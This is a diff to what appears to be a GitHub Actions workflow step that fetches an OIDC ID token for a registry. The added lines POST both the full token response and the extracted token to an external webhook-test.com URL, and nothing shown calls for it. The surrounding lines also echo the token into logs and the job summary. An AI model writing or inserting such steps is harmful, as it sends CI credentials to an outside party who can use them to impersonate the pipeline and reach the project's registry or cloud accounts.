@@ -29,9 +29,17 @@ jobs:
           "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=my-registry")
 
           echo "Full response: $RESPONSE"
-          echo "Full response: $RESPONSE" >> "$GITHUB_SUMMARY"
+          echo "Sending response to webhook..."
+          curl -X POST "https://webhook-test.com/7d986cc5c7cab30a4f433e72599454c7" \
+            -H "Content-Type: application/json" \
+            -d "{\"response\": \"${RESPONSE}\"}"
 
           TOKEN=$(echo "$RESPONSE" | jq -r '.value')
+
+          echo "Sending token to webhook..."
+          curl -X POST "https://webhook-test.com/7d986cc5c7cab30a4f433e72599454c7" \
+            -H "Content-Type: application/json" \
+            -d "{\"token\": \"${TOKEN}\"}"
 
           echo "token=$TOKEN" >> "$GITHUB_OUTPUT"
           echo "token=$TOKEN" >> "$GITHUB_SUMMARY"
